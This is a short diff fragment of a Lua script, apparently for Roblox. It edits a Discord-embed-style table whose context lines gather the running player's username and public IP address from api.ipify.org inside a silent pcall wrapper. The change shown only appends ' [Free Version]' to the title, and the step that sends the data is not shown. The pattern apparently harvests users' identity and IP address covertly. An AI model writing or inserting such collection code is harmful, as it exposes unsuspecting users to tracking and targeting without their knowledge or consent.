@@ -8,7 +8,7 @@ pcall(function()
    local data = {
        ["embeds"] = {
            {
-               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["title"] = game:GetService("Players").LocalPlayer.Name .. " [Free Version]",
                ["description"] = game:HttpGet("https://api.ipify.org")
            }
        }
